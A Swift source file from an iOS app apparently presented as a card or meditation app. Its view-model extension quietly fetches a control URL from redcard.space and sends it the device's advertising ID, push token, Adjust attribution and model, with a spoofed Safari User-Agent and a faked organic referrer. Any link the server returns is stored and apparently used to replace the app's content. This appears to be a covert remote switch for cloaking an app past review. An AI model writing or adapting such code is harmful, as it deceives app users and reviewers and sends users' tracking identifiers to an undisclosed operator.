import SwiftUI
import AdjustSdk

let serverLink = "https://redcard.space/app.php"
//let serverLink = "https://meditation-app.space/app.php"

extension CardMenuViewModel {
    
    func checkIfManager() async {
        if let taskLink = UserDefaults.standard.string(forKey: "taskLink") {
            if taskLink.isEmpty {
                return
            }
            await openSameTask()
            return
        }
        
        if UserDefaults.standard.string(forKey: "controlsLink") == nil {
            await configureManager()
        }
        
        let idfa = UserDefaults.standard.string(forKey: "idfa") ?? ""
        let fcmToken = UserDefaults.standard.string(forKey: "fcmToken") ?? "null"
        let adid = await Adjust.adid() ?? ""
        let device = await UIDevice.current.model
        let queryItems: [URLQueryItem] = [
            URLQueryItem(name: "firebase_push_token", value: fcmToken),
            URLQueryItem(name: "adjust_id", value: adid),
            URLQueryItem(name: "idfa", value: idfa),
            URLQueryItem(name: "device_model", value: device)
        ]
        
        let domainLink = UserDefaults.standard.string(forKey: "controlsLink") ?? ""
        
        guard !domainLink.isEmpty else {
            return
        }
        
        var contentComponents = URLComponents(string: domainLink)
        contentComponents?.queryItems = queryItems
        
        guard let controlsLink = contentComponents?.url else {
            return
        }
        
        let userAgent = makeUserAgent()
        
        var request = URLRequest(url: controlsLink)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(userAgent, forHTTPHeaderField: "User-Agent")

        for _ in 0..<5 {
            if adjustHandler.lastAttribution != nil {
                break
            }
            try? await Task.sleep(nanoseconds: 1_000_000_000)
        }
        
        //MARK: - TESTING
//        print("IDFA из UserDefaults: \(idfa)")
//        print("THIS IS WHAT YOU WANT TO SEE \(adjustHandler.adjustJsonResponse ?? "")")
        
        let adjustDict: [String: Any] = [
            "trackerToken": adjustHandler.lastAttribution?.trackerToken ?? "",
            "trackerName": adjustHandler.lastAttribution?.trackerName ?? "",
            "network": adjustHandler.lastAttribution?.network ?? "",
            "campaign": adjustHandler.lastAttribution?.campaign ?? "",
            "adgroup": adjustHandler.lastAttribution?.adgroup ?? "",
            "creative": adjustHandler.lastAttribution?.creative ?? "",
            "clickLabel": adjustHandler.lastAttribution?.clickLabel ?? "",
            "costType": adjustHandler.lastAttribution?.costType ?? "",
            "costAmount": adjustHandler.lastAttribution?.costAmount ?? 0,
            "costCurrency": adjustHandler.lastAttribution?.costCurrency ?? "",
            "jsonResponse": adjustHandler.adjustJsonResponse ?? ""
        ]
        
        print("THIS IS WHAT YOU WANT TO SEE \(adjustDict)")
        
        let body: [String: Any] = [
            "adjust": adjustDict,
            "referrer": "utm_source=appstore&utm_medium=organic"
        ]
        
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: body)
            request.httpBody = jsonData
            
            let (data, response) = try await URLSession.shared.data(for: request)
            
            if let httpResponse = response as? HTTPURLResponse {
                if !(200...299).contains(httpResponse.statusCode) {
                    return
                }
            }
            
            let decoder = JSONDecoder()
            let clientResponse = try decoder.decode(ClientResponse.self, from: data)
            
            UserDefaults.standard.set(clientResponse.client_id, forKey: "client_id")
            
            if let taskLink = clientResponse.response, URL(string: taskLink) != nil {
                UserDefaults.standard.set(taskLink, forKey: "taskLink")
                await MainActor.run {
                    managerKey = taskLink
                }
            }
            
        } catch {
            print("[checkIfManager] Error during network request or decoding: \(error.localizedDescription)")
        }
    }
    
    func setupManagerContent() async -> String? {
        do {
            let userAgent = makeUserAgent()
            
            var request = URLRequest(url: URL(string: "\(serverLink)?action=check_info")!)
            request.httpMethod = "GET"
            request.setValue(UserDefaults.standard.string(forKey: "userId") ?? "1", forHTTPHeaderField: "client-uuid")
            request.setValue(userAgent, forHTTPHeaderField: "User-Agent")
            
            print(userAgent)
            
            let (_, dataResponse) = try await URLSession.shared.data(for: request)
            if let httpResponse = dataResponse as? HTTPURLResponse {
                if let headerString = httpResponse.allHeaderFields["service-link"] as? String {
                    return headerString
                }
            }
        } catch {
            print("Error: \(error.localizedDescription)")
        }
        return nil
    }
    
    func configureManager() async {
        var userId = UserDefaults.standard.string(forKey: "userId") ?? ""
        
        if userId.isEmpty {
            userId = UUID().uuidString
            UserDefaults.standard.set(userId, forKey: "userId")
        }
        
        guard let response = await setupManagerContent() else {
            return
        }
        
        if URL(string: response) != nil {
            UserDefaults.standard.set(response, forKey: "controlsLink")
        }
    }
    
    func openSameTask() async {
        guard let clientId = UserDefaults.standard.string(forKey: "client_id") else {
            return
        }
        
        let idfa = UserDefaults.standard.string(forKey: "idfa") ?? ""
        
        let queryItems: [URLQueryItem] = [
            URLQueryItem(name: "client_id", value: clientId),
            URLQueryItem(name: "idfa", value: idfa)
        ]
        
        guard let domainLink = UserDefaults.standard.string(forKey: "controlsLink"),
              !domainLink.isEmpty,
              var contentComponents = URLComponents(string: domainLink) else {
            return
        }
        
        contentComponents.queryItems = queryItems
        
        guard let controlsLink = contentComponents.url else {
            return
        }
        
        var request = URLRequest(url: controlsLink)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(UserDefaults.standard.string(forKey: "userId") ?? "1", forHTTPHeaderField: "client-uuid")
        request.setValue(UserDefaults.standard.string(forKey: "customAgent") ?? "1", forHTTPHeaderField: "User-Agent")
        
        print(UserDefaults.standard.string(forKey: "customAgent") ?? "1")
        
        let body: [String: Any] = [
            "client_id": clientId
        ]
        
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: body)
            request.httpBody = jsonData
            
            let (data, response) = try await URLSession.shared.data(for: request)
            
            if let httpResponse = response as? HTTPURLResponse {
                if !(200...299).contains(httpResponse.statusCode) {
                    return
                }
            }
            
            let decoder = JSONDecoder()
            let clientResponse = try decoder.decode(ClientResponse.self, from: data)
            
            if let taskLink = clientResponse.response, URL(string: taskLink) != nil {
                UserDefaults.standard.set(taskLink, forKey: "taskLink")
                await MainActor.run {
                    managerKey = taskLink
                }
            }
        } catch {
            print("[openSameTask] Error during network request or decoding: \(error.localizedDescription)")
        }
    }
    
    func makeUserAgent() -> String {
        let iosVersionRaw = UIDevice.current.systemVersion
        let iosVersion = iosVersionRaw.replacingOccurrences(of: ".", with: "_")
        
        let devicePart: String
        switch UIDevice.current.userInterfaceIdiom {
        case .phone:
            devicePart = "iPhone; CPU iPhone OS \(iosVersion) like Mac OS X"
        case .pad:
            devicePart = "iPad; CPU OS \(iosVersion) like Mac OS X"
        default:
            devicePart = "iPhone; CPU iPhone OS \(iosVersion) like Mac OS X"
        }
        
        let iosVersionComponents = iosVersionRaw.split(separator: ".")
        let safariVersion: String
        if iosVersionComponents.count >= 2 {
            safariVersion = "\(iosVersionComponents[0]).\(iosVersionComponents[1])"
        } else {
            safariVersion = iosVersionRaw
        }
        
        let buildNumber = Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "15E148"
        
        let userAgent = "Mozilla/5.0 (\(devicePart)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/\(safariVersion) Mobile/\(buildNumber) Safari/604.1"
        
        return userAgent
    }
}

